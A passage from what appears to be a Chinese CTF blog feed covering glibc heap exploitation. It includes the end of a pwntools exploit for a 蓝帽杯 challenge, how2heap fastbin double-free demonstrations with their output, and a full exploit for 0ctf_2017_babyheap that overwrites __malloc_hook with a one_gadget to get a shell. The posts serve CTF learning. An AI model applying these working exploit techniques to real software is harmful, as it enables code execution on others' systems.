class="hljs-number">44</span>)<br>ru(<span class="hljs-string">&#x27;I think &#x27;</span>)<br>heap_addr = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xfffffffff000</span><br>lg(<span class="hljs-string">&#x27;heap_addr&#x27;</span>)<br>ptr_init = heap_addr + <span class="hljs-number">0x2a0</span><br>lg(<span class="hljs-string">&#x27;ptr_init&#x27;</span>)<br><br><span class="hljs-comment"># leak libc</span><br><span class="hljs-comment"># tcache_max = 0x410</span><br><span class="hljs-comment"># make fake_chunk(size &gt; 0x410)</span><br>free_ptr = heap_addr + <span class="hljs-number">0x4e0</span> + <span class="hljs-number">0x10</span>     <span class="hljs-comment"># 0x420</span><br>lg(<span class="hljs-string">&#x27;free_ptr&#x27;</span>)<br>guest(<span class="hljs-number">44</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>))      <span class="hljs-comment"># fake_head</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    guest(<span class="hljs-number">44</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)<br>guest(<span class="hljs-number">44</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>))<br>guest(<span class="hljs-number">44</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>))<br>Put(<span class="hljs-number">7</span>)       <span class="hljs-comment"># 51 - 44 = 7</span><br>hacker(<span class="hljs-number">51</span>, free_ptr)<br>Put(<span class="hljs-number">23</span>)       <span class="hljs-comment"># 74 - 51 = 23</span><br>admin(<span class="hljs-number">74</span>)<br>ru(<span class="hljs-string">&#x27;I think &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>rtld = libc_base + <span class="hljs-number">0x22e060</span><br>lg(<span class="hljs-string">&#x27;rtld&#x27;</span>)<br>hook = rtld + <span class="hljs-number">0xf08</span><br>lg(<span class="hljs-string">&#x27;hook&#x27;</span>)<br>onegadget = libc_base + <span class="hljs-number">0xe3afe</span><br>lg(<span class="hljs-string">&#x27;onegadget&#x27;</span>)<br><br><span class="hljs-comment"># change hook-&gt;onegadget</span><br>hacker(<span class="hljs-number">74</span>, ptr_init)<br>guest(<span class="hljs-number">74</span>, p64(hook) * <span class="hljs-number">2</span>)<br>abyss(<span class="hljs-number">74</span>, onegadget)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝帽杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习how2heap的glibc2.23系列</title>
    <link href="/2022/07/08/Pwn/glibc-2.23/"/>
    <url>/2022/07/08/Pwn/glibc-2.23/</url>
    
    <content type="html"><![CDATA[<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><h3 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br><span class="hljs-comment">// free(a);</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// 二次释放堆块a</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br><br>a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><span class="hljs-comment">// 形成了堆块a和堆块b的循环链表</span><br><br><br>assert(a == c);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup<br>This file demonstrates a simple <span class="hljs-type">double</span>-<span class="hljs-built_in">free</span> attack with fastbins.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x14b5010 again, things will crash because 0x14b5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x14b5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x14b5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x14b5010, 0x14b5030, 0x14b5010 ]. If we <span class="hljs-built_in">malloc</span> 3 times, we&#x27;ll get 0x14b5010 twice!<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br></code></pre></td></tr></table></figure><h4 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h4><p>攻击流程：</p><ol><li>分配5个堆块（其中堆块4的请求大小要大于等于0x80，用来泄露libc的基地址），释放堆块1和堆块2，此时堆块1指向堆块2，**需要注意的是，在malloc的时候会检查堆块是否在<code>fastbin</code>中，因此需要我们分配2个堆块，修改使得第2个堆块为<code>fake_chunk</code>**。</li><li>通过堆溢出，修改堆块2<code>fd</code>指针的低位指向堆块4，此时将堆块4接在了堆块2的后面，这时候我们再分配的0x10的堆块，就会在堆块4的地方分配，造成堆块重叠。<strong>需要注意的是，我们需要通过堆溢出将堆块4的<code>size</code>位改为0x21，否则无法绕过检查，在malloc的时候会检查分配的堆块大小与<code>size</code>是否符合</strong>。</li><li>通过堆溢出修改堆块4的<code>size</code>为0x91，释放堆块4，将其链入<code>unsortedbin</code>，泄露libc的地址，<strong>需要注意的是，我们需要在堆块4之后再分配一个堆块，防止其释放的时候与<code>top chunk</code>合并</strong>。</li><li>分配0x60的堆块，利用错位偏移的技巧将堆块分配在<code>__malloc_hook()</code>函数附近，修改钩子。</li></ol><p><code>main_arena</code>和<code>__malloc_hook</code>的位置如下所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0</span>x7f6a86e67b20 - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">0x7f6a86e67b00</span> &lt;__memalign_hook&gt;:<span class="hljs-number">0</span>x00007f6a86b28ea0<span class="hljs-number">0</span>x00007f6a86b28a70<br><span class="hljs-attribute">0x7f6a86e67b10</span> &lt;__malloc_hook&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b20</span> &lt;main_arena&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0</span>x6a86b28ea0000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x00005614ee1f61a0<br><span class="hljs-attribute">0x7f6a86e67b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0</span>x00005614ee1f60f0<span class="hljs-number">0</span>x00005614ee1f60f0<br><span class="hljs-attribute">0x7f6a86e67b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0</span>x00005614ee1f60f0<span class="hljs-number">0</span>x00007f6a86e67b88<br><span class="hljs-attribute">0x7f6a86e67ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67b88<span class="hljs-number">0</span>x00007f6a86e67b98<br><span class="hljs-attribute">0x7f6a86e67bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67b98<span class="hljs-number">0</span>x00007f6a86e67ba8<br><span class="hljs-attribute">0x7f6a86e67bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67ba8<span class="hljs-number">0</span>x00007f6a86e67bb8<br><span class="hljs-attribute">0x7f6a86e67bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67bb8<span class="hljs-number">0</span>x00007f6a86e67bc8<br><span class="hljs-attribute">0x7f6a86e67be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67bc8<span class="hljs-number">0</span>x00007f6a86e67bd8<br></code></pre></td></tr></table></figure><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./0ctf_2017_babyheap&quot;</span>)<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,25261)</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allo</span>(<span class="hljs-params">size</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>allo(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 The original position of 2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 4 Simultaneous pointing</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x80</span>)<br><br>free(<span class="hljs-number">4</span>)<br><br>dump(<span class="hljs-number">2</span>)<br>content = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(content))<br>libc_base = (content) - <span class="hljs-number">0x3c4b78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>allo(<span class="hljs-number">0x60</span>)<br><br>free(<span class="hljs-number">4</span>)<br>payload = p64(libc_base + <span class="hljs-number">0x3C4AED</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x60</span>)<br>allo(<span class="hljs-number">0x60</span>)<br>gdb.attach(p)<br>pause()<br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">0x2</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">1</span>)<br>payload += p64(libc_base+<span class="hljs-number">0x4526a</span>)<br><br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">79</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span><br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);<br><br><br><br><span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>);<span class="hljs-comment">// 分配一个大小为0x40的堆块</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p1);<br><br><br><span class="hljs-comment">// 再次malloc的时候，会调用consolidate函数来整理fastbin，由于p1和top chunk相邻，直接合并</span><br><span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);<br><br><br><br>assert(p1 == p3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-comment">//此时，p1所指向的实际是0x400的p3堆块，实际上释放的是p3堆块</span><br><br><br><span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br><br><span class="hljs-comment">//p1,p2,p3都一样</span><br>assert(p4 == p3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_consolidate<br>This is a powerful technique that bypasses the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> check in tcachebin.<br>Fill up the tcache <span class="hljs-built_in">list</span> to force the fastbin usage...<br>Allocate another chunk of the same size p1=<span class="hljs-number">0x1a13420</span> <br>Freeing p1 will add this chunk to the fastbin <span class="hljs-built_in">list</span>...<br><br>Allocating a tcache-sized chunk (p3=<span class="hljs-number">0x1a13420</span>)<br>will trigger the malloc_consolidate and merge<br>the fastbin chunks into the top chunk, thus<br>p1 and p3 are now pointing to the same chunk !<br><br>Triggering the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> vulnerability!<br><br>The <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> added the chunk referenced by p1 <br>to the tcache thus the next similar-size <span class="hljs-built_in">malloc</span> will<br>point to p3: p3=<span class="hljs-number">0x1a13420</span>, p4=<span class="hljs-number">0x1a13420</span><br></code></pre></td></tr></table></figure><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 